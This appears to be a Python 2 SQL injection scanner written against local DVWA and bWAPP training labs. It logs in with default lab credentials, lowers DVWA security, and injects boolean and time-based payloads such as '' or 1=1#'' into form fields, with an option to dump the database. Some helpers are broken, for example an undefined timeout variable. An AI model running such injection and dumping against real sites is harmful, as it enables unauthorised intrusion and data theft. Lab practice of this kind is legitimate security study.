#!/usr/bin/env python
# -*- encoding: utf-8 -*-

# class for check SQL injection , XSS and LFI


import re
import urllib
import time
import colorama
import itertools
import requests
import sys
from bs4 import BeautifulSoup
import threading
import introduce
import xss
import detect

sqlerrors = {'MySQL': 'error in your SQL syntax'}

# ---------------------------------


CONCURRENCY = 5
_session = requests.session()
_dbms = ''
_resultChild = ''
_contentPage = ''
_url = ''
_done = False


# ---------------------------------

def wordlistimport(file,lst,mess):
		try:
			with open(file,'r') as f: #Importing Payloads from specified wordlist.
				print(colorama.Style.DIM+colorama.Fore.WHITE+"[+] Loading Payloads from specified wordlist..."+mess+colorama.Style.RESET_ALL)
				for line in f:
					final = str(line.replace("\n",""))
					lst.append(final)
		except IOError:
			print(colorama.Style.BRIGHT+colorama.Fore.RED+"[!] Wordlist not found!"+colorama.Style.RESET_ALL)

def login():
    dataForm = {'login': 'bee', 'password': 'bug', 'security_level': 0, 'form': 'submit'}
    _session.post ('http://192.168.141.145/bWAPP/login.php', data=dataForm)
    print colorama.Fore.GREEN+"[*] -> login...done" + colorama.Fore.WHITE

def loginDVWA():
    #  get user token
    urlLogin = 'http://192.168.141.145/login.php' # localhost trên DVWA
    r = _session.get(urlLogin) #_session =  request.session
    parseHTML = BeautifulSoup(r.content,"lxml")
    token = parseHTML.find("input",{"name":"user_token"})['value']

    dataForm = {
        'username':'admin',
        'password':'password',
        'Login':'Login',
        'user_token':token
    }
    _session.post('http://192.168.141.145/login.php', data=dataForm)
    print colorama.Fore.GREEN + "[*] -> login...done" + colorama.Fore.RESET
    # print r1.content
    r1 = _session.get('http://192.168.141.145/security.php')
    parseHTML = BeautifulSoup((r1.content),"lxml")

    token = parseHTML.find ("input", {"name": "user_token"})['value']

    print colorama.Fore.CYAN +"[!] -> token value: " +token + colorama.Fore.RESET

    postValue = {
        'security':'low',
        'seclev_submit':'Submit',
        'user_token':token
    }

    r1 = _session.post('http://192.168.141.145/security.php',data=postValue)
    # print r1.content
    if "<p>Security level is currently: <em>low</em>.<p>" in r1.content:
        print colorama.Fore.CYAN+"[!] -> Security level is currently: low." +colorama.Fore.RESET



def getFormFrom_Url(urlInput,payload):
    # xss
    r = _session.get (urlInput)
    # get all form
    parseHTML = BeautifulSoup (r.content, "lxml")

    htmlForm = parseHTML.find_all('form')

    formArr = []

    for x in htmlForm:
        formArr.append(x) #chèn vào vị trí cuối cùng của list formArr

    #chen moi form mot payload va tra ve string
    payloadArr = []
    for x in formArr:
        inputs = x.find_all('input')
        # if inputs:
        #     print inputs

        # lay tat ca the input trong form
        payString = urlInput
        dem = 0
        if inputs :
            for y in inputs:
                # lay ten cua the input
                temp = ''
                if dem == 0:
                    temp = '?'
                else:
                    temp = '&'

                name = y.attrs['name']
                payString = payString + temp + name + '=' + payload
                dem = 1

            payloadArr.append (payString)

    return payloadArr


def resultPar(content,err):
    parseHTML = BeautifulSoup (content, "lxml")
    par = parseHTML.find_parent(err)


def sqlClassic(host):
    print colorama.Fore.RED + "\n\n[?] -> Checking...Classic" + colorama.Fore.RESET
    vulnerable = False
    EXT = "'"
    global _dbms
    global _contentPage

    host = getFormFrom_Url(host,EXT)[0]

    if host.startswith ("http://") == False:
        host = "http://" + host + "/"

    try:
        source = _session.get (host, timeout=5).text
        _contentPage = source
        # request_web = urllib2.Request(host+EXT)
        # request_web.add_header('User-Agent', headers)
        # text = urllib2.urlopen(request_web)
        # source = text.read()
        # print source
        for type, eMSG in sqlerrors.items ():
            if re.search (eMSG, source, re.I) != None:
                vulnerable = True
                print colorama.Fore.RED + "[!] -> SQL Vulnerable :", host + " " + eMSG + " " + type
                _dbms = type
    except Exception, e:
        print e

    if vulnerable == False:
        print colorama.Fore.GREEN+"[-] -> Not SQL Vulnerable"+colorama.Fore.RESET

    return vulnerable


def sqlBlind_Contenbase(host):
    print colorama.Fore.RED + "\n\n[?] -> Checking...Contenbase" + colorama.Fore.RESET
    payload = "' or 1=1#"
    payload1 = "' or 1=2#"
    payload = urllib.quote(payload)
    payload1 = urllib.quote(payload1)

#     init request

    host1 = getFormFrom_Url(host,payload)[0]

    if host.startswith ("http://") == False:
        host = "http://" + host + "/"

    host2 = getFormFrom_Url (host, payload1)[0]
    if host.startswith ("http://") == False:
        host = "http://" + host + "/"

    try:
        source = _session.get(host1, timeout=5).text
        source1 = _session.get(host2,timeout=5).text
        if source!=source1:
            print colorama.Fore.RED + "[!] -> Detected SQL Injection "+ host1+ colorama.Fore.RESET
            ktD = raw_input(colorama.Fore.LIGHTYELLOW_EX+"[!] -> Dump database(y/n): " +colorama.Fore.RESET)
            if ktD=='y':
                # print host
                detect.detect_version(host,_session)

        else:
            print colorama.Fore.GREEN+"[*] -> Not SQL Vulnerable"+colorama.Fore.RESET
    except Exception,e:
        print colorama.Back.RED + e.message




def testTimeOut(host):
    timeout = 0
    t0 = time.time()
    try:
        r = _session.get (host, verify=False, timeout=x)
        if r.status_code == 200:
            timeout = time.time()-t0
    except Exception, e:
        pass

    return timeout

def animate():
    global _done
    animation = "|/-\\"

    for i in range (100):
        if _done:
            break
        time.sleep (0.1)
        sys.stdout.write ("\r" + animation[i % len (animation)])
        sys.stdout.flush ()
    print "End!"


def open_url(payl):

    try:
        r1 = _session.get (payl,verify=False,timeout=10)
        if r1.status_code==200:
            print colorama.Fore.GREEN + "[*] -> "+str(r1.status_code) +" "+ payl +colorama.Fore.RESET
        else:
            print colorama.Fore.RED + "[*] -> " + str (r1.status_code) + " " + payl +colorama.Fore.RESET
    except requests.exceptions.Timeout,e:
        print colorama.Fore.RED + 20*'-'+" SQL Vulnerable "+20*'-'
        print str(e.message)
        print str(payl)
        print 50 * '-'+ colorama.Fore.WHITE


def sqlBlind_Timebase(host):
    global _done
    print colorama.Fore.RED+"\n\n[?] -> Checking...Timebase"+colorama.Fore.RESET
    # threading.Thread(target=animate).start ()
    payload = []
    wordlistimport('wTimebase.txt',payload,"wTimebase.txt")
    newPayload = []

    # host = getFormFrom_Url(host,payload)[0]
    if host.startswith ("http://") == False:
        host = "http://" + host + "/"

    for x in payload:
        x = urllib.quote(x)
        newPayload.append(getFormFrom_Url(host,x))

    timeout = testTimeOut(getFormFrom_Url(host,"a")[0])



    for payl in newPayload:
        t = threading.Thread (target=open_url, args={payl[0]})
        t.start ()
        t.join ()



        # open_url(payl[0])



if __name__ == '__main__':

    introduce.banner()
    print colorama.Fore.WHITE +20*'-'+ " SQL Injection " +20*'-'+ colorama.Fore.RESET
    _url = raw_input("[!] -> inpur url: ")
    ktlogin = raw_input("[!] -> do you want to login (y/n): ")
    if ktlogin=="y":
        # login()
        loginDVWA()
    sqlClassic(_url)
    sqlBlind_Contenbase(_url)
    sqlBlind_Timebase(_url)

